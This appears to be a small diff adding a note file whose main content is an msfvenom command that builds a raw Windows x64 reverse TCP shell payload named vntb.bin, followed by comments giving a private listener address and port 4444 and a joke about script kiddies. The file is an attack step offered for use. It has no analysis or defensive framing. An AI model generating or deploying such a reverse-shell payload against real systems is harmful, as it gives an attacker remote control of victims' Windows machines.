@@ -1,0 +1,6 @@
+#Execute this code in the Linux terminal to generate the vntb.bin file.
+
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=[YOUR_IP] LPORT=[YOUR_PORT] -f raw -o vntb.bin
+
+#as of now my ip is 192.168.0.121 so i will be using that and i am selecting port 4444
+#now script kiddies think got this mans ip address LOL!!!! not that
